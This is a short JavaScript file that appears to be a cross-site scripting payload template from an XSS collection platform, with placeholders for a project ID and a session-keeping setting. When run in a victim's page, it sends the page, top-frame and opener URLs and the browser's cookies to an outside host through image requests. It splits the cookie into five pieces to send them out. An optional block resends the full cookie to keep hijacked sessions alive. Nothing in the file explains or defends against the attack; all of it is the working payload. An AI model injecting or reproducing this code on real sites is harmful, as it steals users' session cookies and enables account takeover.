(function() {
    (new Image()).src = 'http://www.yc-so.com/xser/s.php?do=api&id={projectId}&location=' + escape((function() {
        try {
            return document.location.href
        } catch (e) {
            return ''
        }
    })()) + '&toplocation=' + escape((function() {
        try {
            return top.location.href
        } catch (e) {
            return ''
        }
    })()) + '&c=' + escape((function() {
        try {
            var c1=document.cookie;
            var clen=c1.length/5;
            c2=c1.substring(0,clen);      
 
            var clen2=clen+clen;
            c3=c1.substring(clen, clen2);
            
            var clen3=clen+clen+clen;
            c4=c1.substring(clen2,clen3);
            
            var clen4=clen+clen+clen+clen;
            c5=c1.substring(clen3,clen4);
            
            var clen5=clen+clen+clen+clen+clen;
            c6=c1.substring(clen4,clen5);
            
           keep1 = new Image();
           keep2 = new Image();
           keep3 = new Image();
           keep4 = new Image();
           keep5 = new Image();
            
           keep1.src ='http://www.yc-so.com/xser/s.php?c='+escape(c2);
           keep2.src ='http://www.yc-so.com/xser/s.php?c='+escape(c3);
           keep3.src ='http://www.yc-so.com/xser/s.php?c='+escape(c4);
           keep4.src ='http://www.yc-so.com/xser/s.php?c='+escape(c5);
           keep5.src ='http://www.yc-so.com/xser/s.php?c='+escape(c6);

            return c4;
        } catch (e) {
            return ''
        }
    })()) + '&opener=' + escape((function() {
        try {
            return (window.opener && window.opener.location.href) ? window.opener.location.href : ''
        } catch (e) {
            return ''
        }
    })());
})();
if ('{set.keepsession}' == 1) {
    keep = new Image();
    keep.src = 'http://www.yc-so.com/xser/s.php?do=keepsession&id={projectId}&url=' + escape(document.location) + '&cookie=' + escape(document.cookie)
};
